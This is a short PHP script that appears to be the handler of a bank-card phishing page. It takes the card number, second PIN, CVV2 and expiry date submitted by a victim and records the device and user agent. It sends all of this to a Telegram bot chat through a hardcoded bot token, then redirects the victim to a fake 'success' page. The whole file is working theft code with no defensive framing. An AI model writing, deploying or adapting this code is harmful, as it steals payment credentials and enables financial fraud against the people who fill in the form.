<?php

$token = "6736145768:AAH72cQONeCkjwfNypU2_owHCLepRuWCyX0";
$id = -4041024884;

include "./Bankinfo.php";



$CardNumber = $_POST["CardNumber"];
$Pin2 = $_POST["Pin2"];
$Cvv2 = $_POST["Cvv2"];
$ExpireYear = $_POST["ExpireYear"];
$ExpireMonth = $_POST["ExpireMonth"];
$bankinfo = bank_information($CardNumber);
$usg = $_SERVER['HTTP_USER_AGENT'];
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}

$ip = $_SERVER["REMOTE_ADDR"];

$Text = "
╔  • New Card! •  
║  #IsTa⏰
╠ •Bank :  $bankinfo[1]
╠ •Card Number : <code>$CardNumber</code>
╠ •Pass2 : <code>$Pin2</code>
╠ •Cvv2 : <code>$Cvv2</code>
╠ •Date : $ExpireYear / $ExpireMonth 
╠ • device : $model 
╠ • info : <code>$usg</code> 
╚  • @Drvex •
";
$ok = 
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=".urlencode($Text));
    header("location:./success");
?>